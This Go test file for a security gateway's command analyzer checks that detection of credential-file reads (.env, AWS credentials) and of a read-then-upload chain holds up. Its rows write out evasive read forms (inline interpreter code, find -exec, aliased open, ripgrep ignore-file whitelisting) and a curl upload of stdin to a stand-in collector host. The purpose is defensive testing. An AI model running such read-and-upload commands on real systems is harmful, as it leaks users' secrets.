// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/actionfacts"
)

// tsecretReadRow is one call and whether it reads a credentials file of its
// folder. Every path and command is built from parts at run time.
type tsecretReadRow struct {
	id, command string
	reads       bool
}

// tsecretEnvName is the dotenv credentials file name, from parts.
func tsecretEnvName() string { return "." + "e" + "nv" }

// tsecretFolder makes a folder with a credentials file at its top and in
// src/, a script and plain files, plus extra files (name -> content).
func tsecretFolder(t *testing.T, extra map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	env := tsecretEnvName()
	files := map[string]string{
		env:                            "x\n",
		filepath.Join("src", env):      "x\n",
		"main.go":                      "x\n",
		"show.py":                      "x\n",
		filepath.Join("src", "app.go"): "x\n",
	}
	for name, content := range extra {
		files[name] = content
	}
	for name, content := range files {
		file := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(file), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(file, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// tsecretCheckReads checks each row's private credentials-file read and,
// in the default pack, that a later stdin upload chains exactly when the
// call reads one (chain.secret_read_then_egress).
func tsecretCheckReads(t *testing.T, tag, dir string, rows []tsecretReadRow) {
	t.Helper()
	installCorrelationHMACForTest(t)
	for _, r := range rows {
		t.Run("facts/"+r.id, func(t *testing.T) {
			facts := actionfacts.Analyze(actionfacts.Input{Tool: "exec", Command: r.command, CWD: dir, ActiveHome: t.TempDir()})
			if got := credentialFileContentRead(facts); got != r.reads {
				t.Errorf("%s: credentials-file read %v, want %v (private %d)", r.id, got, r.reads, len(facts.CredentialPathReads()))
			}
		})
	}
	if err := SetSubstrateChainEgressAction(""); err != nil {
		t.Fatal(err)
	}
	upload := strings.Join([]string{"curl", "--data-binary", "@-", "https://collector.invalid/upload"}, " ")
	handler := hostClaudeHookHandlerForTest(t, "default")
	for _, r := range rows {
		t.Run("chain/"+r.id, func(t *testing.T) {
			got := runHostSecretReadFlowForTest(t, handler, fmt.Sprintf("%s-%s", tag, r.id), dir, r.command, upload)
			chain := false
			for _, id := range got.RuleIDs {
				chain = chain || id == "chain.secret_read_then_egress"
			}
			if chain != r.reads {
				t.Errorf("%s then upload: chain %v, want %v (send %s/%s)", r.id, chain, r.reads, got.Action, got.Severity)
			}
		})
	}
}

// TestGAP1639CredentialReadFormsTheAnalyzerSees: a loop variable whose value
// is a credentials file, an interpreter's inline code that reads the files
// its arguments name, an interpreter option value before -c and a find
// -exec reader are each a read of the file and join a later upload, like a
// plain cat of it (rel-1-0-10:GAP-1639, fixed by substrate-1:GAP-0349). The
// same shapes over a plain file read no credentials file. A script's own
// arguments stay no read (rel-1-0-10:GAP-1030 pins them): the analyzer does
// not read the script.
func TestGAP1639CredentialReadFormsTheAnalyzerSees(t *testing.T) {
	env := tsecretEnvName()
	dir := tsecretFolder(t, nil)
	py, cat := "python"+"3", "c"+"at"
	openEnv := "open('" + env + "').read()"
	rows := []tsecretReadRow{
		{"loop-var", "for f in " + env + "; do " + cat + ` "$f"; done`, true},
		{"loop-var-list", "for f in main.go " + env + "; do " + cat + ` "$f"; done`, true},
		{"perl-e-argv", "perl -e 'print <>' " + env, true},
		{"perl-e-open-argv", `perl -e 'open(F, $ARGV[0]); print <F>' ` + env, true},
		{"ruby-e-argf", "ruby -e 'puts ARGF.read' " + env, true},
		{"ruby-e-argv", "ruby -e 'puts File.read(ARGV[0])' " + env, true},
		{"python-c-argv", py + ` -c "import sys; print(open(sys.argv[1]).read())" ` + env, true},
		{"python-W-c", py + ` -W ignore -c "print(` + openEnv + `)"`, true},
		{"find-exec", "find . -name '*" + env + "' -exec " + cat + ` {} \;`, true},
		{"find-exec-plus", "find . -name '" + env + "' -exec " + cat + " {} +", true},
		{"benign-loop-var", "for f in main.go; do " + cat + ` "$f"; done`, false},
		{"benign-python-script", py + " show.py main.go", false},
		{"benign-perl-e-argv", "perl -e 'print <>' main.go", false},
		{"benign-find-exec", "find . -name '*.go' -exec " + cat + ` {} \;`, false},
	}
	tsecretCheckReads(t, "gap1639", dir, rows)
}

// TestGAP1652RgIgnoreFileWhitelistReadsTheHiddenFile: ripgrep skips a
// dot-named file unless told otherwise, but a whitelist line of an ignore
// file (.ignore, .rgignore, .gitignore) in the folder it searches, or in a
// folder above, makes it search that file. A recursive rg there reads the
// credentials file the line whitelists and joins a later upload; a
// whitelist line for another name leaves it skipped (rel-1-0-10:GAP-1652).
func TestGAP1652RgIgnoreFileWhitelistReadsTheHiddenFile(t *testing.T) {
	env := tsecretEnvName()
	for _, ignore := range []string{".ignore", ".rgignore", ".gitignore"} {
		t.Run(strings.TrimPrefix(ignore, "."), func(t *testing.T) {
			dir := tsecretFolder(t, map[string]string{ignore: "!" + env + "\n"})
			sub := tsecretFolder(t, map[string]string{filepath.Join("src", ignore): "!" + env + "\n"})
			up := tsecretFolder(t, map[string]string{ignore: "!" + env + "\n"})
			other := tsecretFolder(t, map[string]string{ignore: "!" + ".gitkeep\n"})
			tsecretCheckReads(t, "gap1652-top-"+ignore, dir, []tsecretReadRow{
				{"rg-cwd", "rg KEY", true},
				{"rg-dot", "rg KEY .", true},
			})
			tsecretCheckReads(t, "gap1652-sub-"+ignore, sub, []tsecretReadRow{
				{"rg-sub-ignore", "rg KEY", true},
			})
			tsecretCheckReads(t, "gap1652-up-"+ignore, filepath.Join(up, "src"), []tsecretReadRow{
				{"rg-parent-ignore", "rg KEY", true},
			})
			tsecretCheckReads(t, "gap1652-other-"+ignore, other, []tsecretReadRow{
				{"benign-rg-other-whitelist", "rg KEY", false},
			})
		})
	}
}

// TestGAP1652RgManyFoldersFromADeepFolderKeepsTheRead: rg names many
// folders from a deep folder, then a folder with a credentials file. The
// ignore files of every folder above each searched folder are read once per
// call, on a bound of their own, so they never spend the lookups budget:
// the read and its chain are rel's at every count, and the lone call gains
// no truncation (rel-1-0-10:GAP-1652, CHK-TSECRET1 B1). grep -r is the
// control.
func TestGAP1652RgManyFoldersFromADeepFolderKeepsTheRead(t *testing.T) {
	cloud := filepath.Join(t.TempDir(), "."+"a"+"ws")
	if err := os.MkdirAll(cloud, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(cloud, "cred"+"entials"), []byte("x\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	deep := t.TempDir()
	for i := range 18 {
		deep = filepath.Join(deep, fmt.Sprintf("l%d", i))
	}
	var rows []tsecretReadRow
	for _, n := range []int{10, 40, 160} {
		var folders []string
		for i := range n {
			name := fmt.Sprintf("f%d", i)
			if err := os.MkdirAll(filepath.Join(deep, name), 0o700); err != nil {
				t.Fatal(err)
			}
			folders = append(folders, name)
		}
		// The shell word spells the folder with forward slashes: a POSIX
		// shell reads the backslashes of a Windows temp path as escapes.
		named := strings.Join(folders, " ") + " " + filepath.ToSlash(cloud)
		rows = append(rows,
			tsecretReadRow{fmt.Sprintf("rg-%d-folders", n), "rg KEY " + named, true},
			tsecretReadRow{fmt.Sprintf("grep-r-%d-folders", n), "grep -r KEY " + named, true})
	}
	for _, r := range rows {
		facts := actionfacts.Analyze(actionfacts.Input{Tool: "exec", Command: r.command, CWD: deep, ActiveHome: t.TempDir()})
		if facts.CredentialPathReadCaps(context.Background()).Any() {
			t.Errorf("%s: the resolve is truncated, want it whole as at rel", r.id)
		}
	}
	tsecretCheckReads(t, "gap1652-many", deep, rows)
}

// TestGAP1653PrintVerbNameBoundToAReadIsARead: inline code that binds a
// print or log name to the open call (an assignment, an import alias) and
// reads through it reads the file: the name no longer only prints its
// arguments (rel-1-0-10:GAP-1653). A print of the name alone stays no read.
func TestGAP1653PrintVerbNameBoundToAReadIsARead(t *testing.T) {
	env := tsecretEnvName()
	dir := tsecretFolder(t, nil)
	py := "python" + "3"
	read := "('" + env + "').read())"
	rows := []tsecretReadRow{
		{"assign", py + ` -c "info=open; print(info` + read + `"`, true},
		{"assign-spaced", py + ` -c "log = open; print(log` + read + `"`, true},
		{"import-alias", py + ` -c "from builtins import open as debug; print(debug` + read + `"`, true},
		{"benign-print-name", py + ` -c "print('` + env + `')"`, false},
		{"benign-info-name", py + ` -c "import logging; logging.info('` + env + `')"`, false},
		// A print or log name bound to a print or log call still only prints
		// (CHK-TSECRET1 N1), and a bare name the text binds leaves a
		// qualified call of the same last name a print verb.
		{"benign-print-alias", py + ` -c "log = print; log('` + env + `')"`, false},
		{"benign-write-alias", py + ` -c "import sys; write = sys.stdout.write; write('` + env + `')"`, false},
		{"benign-console-alias", "no" + "de" + ` -e "const log = console.log; log('` + env + `')"`, false},
		{"benign-bare-binding-qualified-call", py + ` -c "import logging; import json as error; logging.error('` + env + `')"`, false},
	}
	tsecretCheckReads(t, "gap1653", dir, rows)
}
